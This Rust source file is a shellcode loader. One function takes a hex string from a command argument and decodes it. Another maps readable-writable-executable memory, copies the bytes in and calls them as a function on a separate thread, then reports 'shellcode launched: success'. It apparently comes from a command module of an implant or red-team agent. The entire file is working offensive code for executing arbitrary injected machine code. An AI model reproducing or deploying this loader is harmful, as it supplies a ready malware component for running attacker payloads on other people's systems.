extern crate memory_map;

use std::{mem, ptr};
use std::thread;

use memory_map::*;

pub fn asm(cmd_arg: String) -> (String, String) {
    //println!("cmd_arg: {:#?}", cmd_arg);
    let mut iter = cmd_arg.split_whitespace();
    let shellcode = iter.next();

    
    //println!("{:#?}", shellcod.parse::<u8>().unwrap());

    let shellcode_str: &str = match shellcode {
        None => {"90909090"},
        Some(ref sc) => {sc},
    };

    //println!("{:#?}", shellcode_str);
    let _len_shellcode: usize;
    if shellcode_str.len() % 2 == 0 {
        _len_shellcode = shellcode_str.len() / 2;
    }
    else {
        _len_shellcode = (shellcode_str.len() + 1)  / 2 ;
    }

    //let decoded = <[u8; len_shellcode]>::from_hex(sc).expect("Decoding failed");
    let sc = hex::decode(shellcode_str).expect("Decoding failed");

    //println!("{:?}", shellcode);

    //let shellcode = [0xebu8, 0xfe];

    let _child = thread::spawn(move || {
        fire(&sc);
    });

    // 
    
    ("shellcode launched: success".to_string(), "shellcode launched: success".to_string())

}

fn fire(shellcode: &[u8]) {
    let opts = [
        MapOption::MapReadable,
        MapOption::MapWritable,
        MapOption::MapExecutable
    ];

    let mapping = MemoryMap::new(shellcode.len(), &opts).unwrap();

    unsafe {
        ptr::copy(shellcode.as_ptr(), mapping.data(), shellcode.len());
        mem::transmute::<_, fn()>(mapping.data())();
    }
}
